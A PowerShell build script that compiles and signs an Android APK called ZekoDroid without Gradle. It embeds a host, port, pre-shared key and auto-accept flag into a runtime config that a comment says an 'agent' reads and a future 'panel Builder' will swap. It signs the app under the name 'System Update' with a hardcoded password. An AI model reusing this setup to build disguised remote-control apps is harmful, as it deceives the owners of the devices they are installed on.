# Build Android APK without Gradle/AGP: aapt2 + javac + d8 + apksigner.
# Run: .\build.ps1
$ErrorActionPreference = 'Stop'

function Run([string]$exe, [string[]]$argv, [string]$label) {
    $prev = $ErrorActionPreference
    $ErrorActionPreference = 'Continue'
    $out = & $exe @argv 2>&1
    $code = $LASTEXITCODE
    $ErrorActionPreference = $prev
    if ($code -ne 0) {
        $out | Where-Object { $_ -notmatch 'bootstrap class path|deprecated|Note:|^$' } |
            Select-Object -First 15 | ForEach-Object { Write-Host "      $_" -ForegroundColor Red }
        throw "$label failed (exit $code)"
    }
    return $out
}

$root   = Split-Path -Parent $MyInvocation.MyCommand.Path
$sdk    = "$env:LOCALAPPDATA\Android\Sdk"
$bt     = Join-Path $sdk 'build-tools\36.0.0'
$jar    = Join-Path $sdk 'platforms\android-36\android.jar'
$jdk    = 'C:\Program Files\Android\Android Studio\jbr'
$javac  = Join-Path $jdk 'bin\javac.exe'
$keytool= Join-Path $jdk 'bin\keytool.exe'

foreach ($p in @($bt, $jar, $javac, $keytool)) {
    if (-not (Test-Path $p)) { throw "missing: $p" }
}

$app = Join-Path $root 'app'
$out = Join-Path $root 'build'
$gen = Join-Path $out 'gen'
$cls = Join-Path $out 'classes'
$dex = Join-Path $out 'dex'
Remove-Item $out -Recurse -Force -ErrorAction SilentlyContinue
New-Item -ItemType Directory -Force -Path $gen, $cls, $dex | Out-Null

# ---- 1. Cfg.java from config.properties ----
Write-Host "[1/6] generate Cfg.java" -ForegroundColor Cyan
$cfg = @{}
Get-Content (Join-Path $root 'config.properties') | ForEach-Object {
    $line = $_.Trim()
    if ($line -and -not $line.StartsWith('#') -and $line.Contains('=')) {
        $i = $line.IndexOf('=')
        $cfg[$line.Substring(0, $i).Trim()] = $line.Substring($i + 1).Trim()
    }
}
$host_ = if ($cfg['ZK_HOST']) { $cfg['ZK_HOST'] } else { '127.0.0.1' }
$port_ = if ($cfg['ZK_PORT']) { $cfg['ZK_PORT'] } else { '7878' }
$psk_  = if ($cfg.ContainsKey('ZK_PSK')) { $cfg['ZK_PSK'] } else { '' }
$auto_ = if ($cfg['ZK_AUTO_ACCEPT'] -eq '0') { '0' } else { '1' }

# ghi assets/zk.conf — agent đọc lúc runtime, panel Builder sau này chỉ thay file này rồi ký lại
New-Item -ItemType Directory -Force -Path (Join-Path $app 'assets') | Out-Null
$conf = "host=$host_`nport=$port_`npsk=$psk_`nauto=$auto_`n"
[IO.File]::WriteAllText((Join-Path $app 'assets\zk.conf'), $conf, (New-Object System.Text.UTF8Encoding($false)))
Write-Host "      assets/zk.conf: host=$host_ port=$port_ psk=$(if($psk_){'on'}else{'off'})" -ForegroundColor DarkGray

# ---- 2. aapt2 ----
Write-Host "[2/6] aapt2 compile + link" -ForegroundColor Cyan
$resZip  = Join-Path $out 'res.zip'
$baseApk = Join-Path $out 'base.apk'
Run (Join-Path $bt 'aapt2.exe') @('compile', '--dir', (Join-Path $app 'res'), '-o', $resZip) 'aapt2 compile'
Run (Join-Path $bt 'aapt2.exe') @(
    'link', '-o', $baseApk, '-I', $jar,
    '--manifest', (Join-Path $app 'AndroidManifest.xml'),
    '-R', $resZip, '--java', $gen, '-A', (Join-Path $app 'assets'),
    '--min-sdk-version', '24', '--target-sdk-version', '34',
    '--version-code', '1', '--version-name', '1.0',
    '--auto-add-overlay') 'aapt2 link'

# ---- 3. javac ----
Write-Host "[3/6] javac" -ForegroundColor Cyan
$sources = @()
$sources += Get-ChildItem (Join-Path $app 'src') -Recurse -Filter *.java | Select-Object -ExpandProperty FullName
$sources += Get-ChildItem $gen -Recurse -Filter *.java | Select-Object -ExpandProperty FullName
Run $javac (@('-nowarn', '-encoding', 'UTF-8', '-source', '8', '-target', '8',
    '-classpath', $jar, '-d', $cls) + $sources) 'javac'

# ---- 4. d8 ----
Write-Host "[4/6] d8 -> classes.dex" -ForegroundColor Cyan
$classFiles = Get-ChildItem $cls -Recurse -Filter *.class | Select-Object -ExpandProperty FullName
Run (Join-Path $bt 'd8.bat') (@('--min-api', '21', '--lib', $jar, '--output', $dex) + $classFiles) 'd8'

Add-Type -AssemblyName System.IO.Compression.FileSystem
$zip = [System.IO.Compression.ZipFile]::Open($baseApk, 'Update')
[System.IO.Compression.ZipFileExtensions]::CreateEntryFromFile(
    $zip, (Join-Path $dex 'classes.dex'), 'classes.dex',
    [System.IO.Compression.CompressionLevel]::Optimal) | Out-Null
$zip.Dispose()

# ---- 5. zipalign ----
Write-Host "[5/6] zipalign" -ForegroundColor Cyan
$aligned = Join-Path $out 'aligned.apk'
Run (Join-Path $bt 'zipalign.exe') @('-f', '-p', '4', $baseApk, $aligned) 'zipalign'

# ---- 6. sign ----
Write-Host "[6/6] apksigner" -ForegroundColor Cyan
$ks = Join-Path $root 'zeko.keystore'
if (-not (Test-Path $ks)) {
    Run $keytool @('-genkeypair', '-keystore', $ks, '-alias', 'zeko', '-keyalg', 'RSA',
        '-keysize', '2048', '-validity', '10000', '-storepass', 'zeko123', '-keypass', 'zeko123',
        '-dname', 'CN=System Update, O=Zeko, C=VN') 'keytool'
}
$final = Join-Path $root 'ZekoDroid.apk'
Remove-Item $final -Force -ErrorAction SilentlyContinue
Run (Join-Path $bt 'apksigner.bat') @('sign', '--ks', $ks, '--ks-pass', 'pass:zeko123',
    '--key-pass', 'pass:zeko123', '--min-sdk-version', '24', '--out', $final, $aligned) 'apksigner'

$size = [math]::Round((Get-Item $final).Length / 1KB, 1)
Write-Host ""
Write-Host "OK -> $final  ($size KB)" -ForegroundColor Green
Write-Host "install: adb install -r ZekoDroid.apk" -ForegroundColor DarkGray
